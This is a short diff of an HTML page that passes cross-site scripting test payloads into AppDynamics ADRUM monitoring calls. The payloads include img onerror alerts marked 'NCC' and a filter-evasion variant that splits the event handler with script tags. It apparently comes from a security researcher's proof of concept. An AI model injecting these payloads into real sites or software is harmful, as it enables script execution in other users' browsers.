@@ -61,7 +61,7 @@
     </script>
     <script src='https://cdn.appdynamics.com/adrum/adrum-latest.js'></script>
     <script>
-      ADRUM.command("setPageName", "<img src=x onerror=alert('NCC')>\"</img>");
+      ADRUM.command("setPageName", "<script>alert('NCC')</script><img src=x on<script>a</script>error=alert('NCC')>\"</img>");
       ADRUM.command("setVirtualPageName", "<img src=x onerror=alert('NCC')>\"</img>");
       ADRUM.command("addUserData", "<img src=x onerror=alert('NCC')>\"</img>",
         "<img src=x onerror=alert('NCC')>\"</img>");
